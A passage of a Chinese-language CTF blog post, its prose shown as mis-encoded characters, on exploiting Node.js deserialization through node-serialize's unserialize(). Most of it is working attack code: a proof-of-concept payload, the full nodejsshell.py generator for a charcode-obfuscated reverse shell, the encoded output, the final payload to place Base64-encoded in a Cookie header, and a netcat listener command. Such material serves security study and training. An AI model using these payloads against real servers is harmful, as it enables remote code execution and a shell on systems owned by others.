serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require(\&#x27;child_process\&#x27;).exec(\&#x27;ls /\&#x27;, function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()&quot;&#125;&#x27;</span>;  </span><br><span class="line">serialize.<span class="title function_">unserialize</span>(payload);  </span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/5.png" title="wuhu"><h3 id="è¿›ä¸€æ­¥åˆ©ç”¨"><a href="#è¿›ä¸€æ­¥åˆ©ç”¨" class="headerlink" title="è¿›ä¸€æ­¥åˆ©ç”¨"></a>è¿›ä¸€æ­¥åˆ©ç”¨</h3><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†ï¼Œå¦‚æœä¸å—ä¿¡ä»»çš„æ•°æ®ä¼ å…¥å…¶ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨ node-serialize æ¨¡å—ä¸­çš„ <code>unserialize()</code> å‡½æ•°ã€‚æˆ‘ä»¬æ¥åˆ©ç”¨ Web ç¨‹åºä¸­çš„æ¼æ´åå¼¹ä¸€ä¸ª shell å‡ºæ¥å§ã€‚</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨ <a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">nodejsshell.py</a> ç”Ÿæˆåå‘ shell çš„ payloadã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">//nodejsshell.py</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charencode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span></span><br><span class="line">    encoded = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LPORT = %s&quot;</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">var net = require(&#x27;net&#x27;);</span></span><br><span class="line"><span class="string">var spawn = require(&#x27;child_process&#x27;).spawn;</span></span><br><span class="line"><span class="string">HOST=&quot;%s&quot;;</span></span><br><span class="line"><span class="string">PORT=&quot;%s&quot;;</span></span><br><span class="line"><span class="string">TIMEOUT=&quot;5000&quot;;</span></span><br><span class="line"><span class="string">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span></span><br><span class="line"><span class="string">function c(HOST,PORT) &#123;</span></span><br><span class="line"><span class="string">    var client = new net.Socket();</span></span><br><span class="line"><span class="string">    client.connect(PORT, HOST, function() &#123;</span></span><br><span class="line"><span class="string">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span></span><br><span class="line"><span class="string">        client.write(&quot;Connected!\\n&quot;);</span></span><br><span class="line"><span class="string">        client.pipe(sh.stdin);</span></span><br><span class="line"><span class="string">        sh.stdout.pipe(client);</span></span><br><span class="line"><span class="string">        sh.stderr.pipe(client);</span></span><br><span class="line"><span class="string">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span></span><br><span class="line"><span class="string">          client.end(&quot;Disconnected!\\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    client.on(&#x27;error&#x27;, function(e) &#123;</span></span><br><span class="line"><span class="string">        setTimeout(c(HOST,PORT), TIMEOUT);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">c(HOST,PORT);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (IP_ADDR, PORT)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Encoding&quot;</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> python nodejsshell.py <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">[+] LHOST = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">[+] LPORT = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">[+] Encoding</span><br><span class="line"></span><br><span class="line">eval(String.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">77</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">79</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">10</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">91</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">119</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">92</span>,<span class="number">110</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">44</span>,<span class="number">115</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">68</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">92</span>,<span class="number">110</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">84</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">77</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">125</span>,<span class="number">10</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>))  </span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬ç”Ÿæˆååºåˆ—åŒ–çš„ payloadï¼Œå¹¶åœ¨å‡½æ•°åé¢æ·»åŠ  IIFE æ‹¬å· <code>()</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;rce&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))&#125;()&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åŒæ ·è¦è¿›è¡Œ Base64 ç¼–ç ï¼Œç„¶ååœ¨ Cookie å¤´ä¸­åŠ å…¥ Payloadï¼Œå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</p><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/7.png" title="wuhu"><p>ç„¶åå¼€ç«¯å£ç›‘å¬ shell å³å¯ã€‚</p><p><code>nc -l 127.0.0.1 1337</code></p><img src="/img/loading.gif" data-original="/blog/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/6.png" title="wuhu"><p>ç„¶åæˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªåå¼¹ shellï¼</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://gitee.com/la2y_fish/blog.git">1azy_fish.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://gitee.com/la2y_fish/blog.git/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/">https://gitee.com/la2y_fish/blog.git/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://gitee.com/la2y_fish/blog.git" target="_blank">1azy_fish.</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/blog/img/9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/blog/2023/10/14/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%883%EF%BC%89/" 